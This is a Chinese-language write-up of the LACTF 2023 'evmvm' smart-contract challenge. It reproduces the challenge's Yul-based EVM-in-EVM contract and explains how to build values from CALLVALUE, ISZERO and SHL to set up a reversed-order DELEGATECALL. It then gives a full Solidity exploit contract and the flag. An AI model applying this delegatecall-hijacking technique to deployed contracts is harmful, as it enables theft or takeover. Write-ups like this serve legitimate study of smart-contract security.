# evmvm

这题比赛时根本连看都没看，今天看[wp](https://github.com/Kaiziron/lactf2023-writeup/blob/main/evmvm.md)时才知道这是个ETHEREUM虚拟机题。哈？solidity的虚拟机？看看题目。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./EVMVM.sol";

contract Setup {
    EVMVM public immutable metametaverse = new EVMVM();
    bool private solved = false;

    function solve() external {
        assert(msg.sender == address(metametaverse));
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
```

看起来是要我们用metametaverse（EVMVM）的身份调用这个文件的solve函数。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

// YES I FINALLY GOT MY METAMETAVERSE TO WORK - Arc'blroth
contract EVMVM {
    uint[] private stack;

    // executes a single opcode on the metametaverse™
    // TODO(arc) implement the last few opcodes
    function enterTheMetametaverse(bytes32 opcode, bytes32 arg) external {
        assembly { //assembly的文档：https://docs.soliditylang.org/en/v0.8.19/assembly.html ，里面又是另一种语言：yul（https://docs.soliditylang.org/en/v0.8.17/yul.html）
            // declare yul bindings for the stack
            // apparently you can only call yul functions from yul :sob:
            // https://ethereum.stackexchange.com/questions/126609/calling-functions-using-inline-assembly-yul

            function spush(data) {
                let index := sload(0x00)
                let stackSlot := 0x00
                sstore(add(keccak256(stackSlot, 0x20), index), data)
                sstore(0x00, add(index, 1))
            }

            function spop() -> out {
                let index := sub(sload(0x00), 1)
                let stackSlot := 0x00
                out := sload(add(keccak256(stackSlot, 0x20), index))
                sstore(add(keccak256(stackSlot, 0x20), index), 0) // zero out the popped memory
                sstore(0x00, index)
            }

            // opcode reference: https://www.evm.codes/?fork=merge
            switch opcode
                case 0x00 { // STOP
                    // lmfao you literally just wasted gas
                }
                case 0x01 { // ADD
                    spush(add(spop(), spop()))
                }
                case 0x02 { // MUL
                    spush(mul(spop(), spop()))
                }
                case 0x03 { // SUB
                    spush(sub(spop(), spop()))
                }
                case 0x04 { // DIV
                    spush(div(spop(), spop()))
                }
                case 0x05 { // SDIV
                    spush(sdiv(spop(), spop()))
                }
                case 0x06 { // MOD
                    spush(mod(spop(), spop()))
                }
                case 0x07 { // SMOD
                    spush(smod(spop(), spop()))
                }
                case 0x08 { // ADDMOD
                    spush(addmod(spop(), spop(), spop()))
                }
                case 0x09 { // MULMOD
                    spush(mulmod(spop(), spop(), spop()))
                }
                case 0x0A { // EXP
                    spush(exp(spop(), spop()))
                }
                case 0x0B { // SIGNEXTEND
                    spush(signextend(spop(), spop()))
                }
                case 0x10 { // LT
                    spush(lt(spop(), spop()))
                }
                case 0x11 { // GT
                    spush(gt(spop(), spop()))
                }
                case 0x12 { // SLT
                    spush(slt(spop(), spop()))
                }
                case 0x13 { // SGT
                    spush(sgt(spop(), spop()))
                }
                case 0x14 { // EQ
                    spush(eq(spop(), spop()))
                }
                case 0x15 { // ISZERO
                    spush(iszero(spop()))
                }
                case 0x16 { // AND
                    spush(and(spop(), spop()))
                }
                case 0x17 { // OR
                    spush(or(spop(), spop()))
                }
                case 0x18 { // XOR
                    spush(xor(spop(), spop()))
                }
                case 0x19 { // NOT
                    spush(not(spop()))
                }
                case 0x1A { // BYTE
                    spush(byte(spop(), spop()))
                }
                case 0x1B { // SHL
                    spush(shl(spop(), spop()))
                }
                case 0x1C { // SHR
                    spush(shr(spop(), spop()))
                }
                case 0x1D { // SAR
                    spush(sar(spop(), spop()))
                }
                case 0x20 { // SHA3
                    spush(keccak256(spop(), spop()))
                }
                case 0x30 { // ADDRESS
                    spush(address())
                }
                case 0x31 { // BALANCE
                    spush(balance(spop()))
                }
                case 0x32 { // ORIGIN
                    spush(origin())
                }
                case 0x33 { // CALLER
                    spush(caller())
                }
                case 0x34 { // CALLVALUE
                    spush(callvalue())
                }
                case 0x35 { // CALLDATALOAD
                    spush(calldataload(spop()))
                }
                case 0x36 { // CALLDATASIZE
                    spush(calldatasize())
                }
                case 0x37 { // CALLDATACOPY
                    calldatacopy(spop(), spop(), spop())
                }
                case 0x38 { // CODESIZE
                    spush(codesize())
                }
                case 0x3A { // GASPRICE
                    spush(gasprice())
                }
                case 0x3B { // EXTCODESIZE
                    spush(extcodesize(spop()))
                }
                case 0x3C { // EXTCODECOPY
                    extcodecopy(spop(), spop(), spop(), spop())
                }
                case 0x3D { // RETURNDATASIZE
                    spush(returndatasize())
                }
                case 0x3E { // RETURNDATACOPY
                    returndatacopy(spop(), spop(), spop())
                }
                case 0x3F { // EXTCODEHASH
                    spush(extcodehash(spop()))
                }
                case 0x40 { // BLOCKHASH
                    spush(blockhash(spop()))
                }
                case 0x41 { // COINBASE (sponsored opcode)
                    spush(coinbase())
                }
                case 0x42 { // TIMESTAMP
                    spush(timestamp())
                }
                case 0x43 { // NUMBER
                    spush(number())
                }
                case 0x44 { // PREVRANDAO
                    spush(difficulty())
                }
                case 0x45 { // GASLIMIT
                    spush(gaslimit())
                }
                case 0x46 { // CHAINID
                    spush(chainid())
                }
                case 0x47 { // SELBALANCE
                    spush(selfbalance())
                }
                case 0x48 { // BASEFEE
                    spush(basefee())
                }
                case 0x50 { // POP
                    pop(spop())
                }
                case 0x51 { // MLOAD
                    spush(mload(spop()))
                }
                case 0x52 { // MSTORE
                    mstore(spop(), spop())
                }
                case 0x53 { // MSTORE8
                    mstore8(spop(), spop())
                }
                case 0x54 { // SLOAD
                    spush(sload(spop()))
                }
                case 0x55 { // SSTORE
                    sstore(spop(), spop())
                }
                case 0x59 { // MSIZE
                    spush(msize())
                }
                case 0x5A { // GAS
                    spush(gas())
                }
                case 0x80 { // DUP1
                    let val := spop()
                    spush(val)
                    spush(val)
                }
                case 0x91 { // SWAP1
                    let a := spop()
                    let b := spop()
                    spush(a)
                    spush(b)
                }
                case 0xF0 { // CREATE
                    spush(create(spop(), spop(), spop()))
                }
                case 0xF1 { // CALL
                    spush(call(spop(), spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xF2 { // CALLCODE
                    spush(callcode(spop(), spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xF3 { // RETURN
                    return(spop(), spop())
                }
                case 0xF4 { // DELEGATECALL
                    spush(delegatecall(spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xF5 { // CREATE2
                    spush(create2(spop(), spop(), spop(), spop()))
                }
                case 0xFA { // STATICCALL
                    spush(staticcall(spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xFD { // REVERT
                    revert(spop(), spop())
                }
                case 0xFE { // INVALID
                    invalid()
                }
                case 0xFF { // SELFDESTRUCT
                    selfdestruct(spop())
                }
        }
    }
    //https://www.geeksforgeeks.org/solidity-fall-back-function/ ，如果调用函数时没有其他函数符合调用的修饰或是没有数据提供给函数调用，就会调用它
    fallback() payable external { //payable关键字： https://coinsbench.com/solidity-payable-vs-regular-functions-a-gas-usage-comparison-b4a387fe860d。被修饰的函数可在Ether（EVM里的货币）大于等于0时执行转账
        revert("sus");
    }

    receive() payable external {
        revert("we are a cashless institution");
    }
}
```

EVMVM是个虚拟机。ETHEREUM虚拟机本身就是个虚拟机了，这题又自己实现了一个ETHEREUM虚拟机的虚拟机。enterTheMetametaverse函数一次只能执行一个opcode。这不是问题，问题是没有内存。虚拟机确实实现了`MLOAD/MSTORE/MSTORE8`等内存相关操作码，也有栈存储内容。但一次一个opcode注定了没法使用内存，根本原因在于函数退出后内存mem会被清空，不可能load出来数据。emmm,不用内存行不行？最初的答案是不行，因为在虚拟机里，一般用CALL操作码调用函数。查阅文档，CALL函数会在mem里取出要调用的合约地址。正常使用CALL的步骤是往mem里存要调用的[calldata](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/f958b119-5a8d-4050-ad68-6422d10a7655.xhtml)，即要调用函数的[function selector](https://solidity-by-example.org/function-selector/)和参数等数据，然后传入calldata在mem里的偏移。总而言之，这道题是不能这样调用函数了。

换个操作码：DELEGATECALL，用该操作码调用我们自己写的攻击合约里的fallback函数，剩下的在fallback函数里面完成就好了，省去内存的使用。用这个操作码需要把被调用方的地址push到栈上，这就有了第二个问题：没有实现push操作码。yul里面倒是有个spush，但是我们调用不了。

观察enterTheMetametaverse函数，不难注意到它没有payable修饰符。没有这个修饰符会导致message/transaction的值永远是0。于是CALLVALUE函数（文档里写的是返回当前调用的wei，而wei是个计数单位，就是0）永远会返回0，值存储在栈顶。然后用ISZERO将其变为1，组合DUP1，ADD和SHL等操作码，手动得到想要的数字。这个数字可以作为CALLDATALOAD的参数偏移，帮助我们将攻击的地址push进栈里。至于地址从哪来，enterTheMetametaverse函数有两个参数，而第二个参数arg完全没有被用过。前面提过函数的参数在calldata里，那就可以通过CALLDATALOAD+偏移获取到它，这样就成功把地址放到栈上了。另外，CALLDATALOAD一下读取32字节，所以要把地址填充到32字节：

```solidity
 »  bytes32(abi.encode(address(0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF)))
0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff
```

DELEGATECALL的地址解决了，接下来是调用它所需的[GAS](https://zhuanlan.zhihu.com/p/34960267)。我们用CALLVALUE那个方法往里面push 0x20000就好了。或者直接调用GAS操作码，不过要确保调用GAS时获取到的gaslimit要远远小于DELEGATECALL时的。因为两者不是同时调用的，调用DELEGATECALL时的剩余gas可能小于调用GAS时的剩余GAS。

或者更简单的方式，直接用CALLER操作码获取攻击者的地址。最后要注意的地方是DELEGATECALL的参数传递：

```solidity
delegatecall(spop(), spop(), spop(), spop(), spop(), spop())
```

对于EVM里的DELEGATECALL，spop()会弹出栈顶的元素，让后将其用作第一个参数。然而这里的虚拟机反过来了，栈顶的元素会作为最后一个参数。于是要把参数反着传递进去。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./Setup.sol";

contract EVMVM_Exploit {
    // Original bytecode :
    // 34343434333415801b801b801b3415801b801b800202f4
    /*
    CALLVALUE
    CALLVALUE
    CALLVALUE
    CALLVALUE
    CALLER
    CALLVALUE
    ISZERO
    DUP1
    SHL
    DUP1
    SHL
    DUP1
    SHL
    CALLVALUE
    ISZERO
    DUP1
    SHL
    DUP1
    SHL
    DUP1
    MUL
    MUL
    DELEGATECALL
    */
    // Bytecode that push delegatecall arguments to stack in reverse order 
    // (first item popped from stack will be on the last argument in yul)
    // 3415801b801b801b3415801b801b8002023334343434f4
    function exploit() public {
        address evmvm = address(Setup(0x24B9d51522925271457E44Dc1FbCE9CBd3D3f90E).metametaverse());
        // Push arguments for delegatecall to stack in reverse order
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x15)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x15)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x02)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x02)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x33)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        // delegatecall
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0xf4)), bytes32(0));
    }

    fallback() external payable {
        Setup(address(0x24B9d51522925271457E44Dc1FbCE9CBd3D3f90E)).solve();
    }
}
```

调用exploit函数即可获取flag。

## Flag
> lactf{yul_hav3_a_bad_t1me_0n_th3_m3tam3tavers3}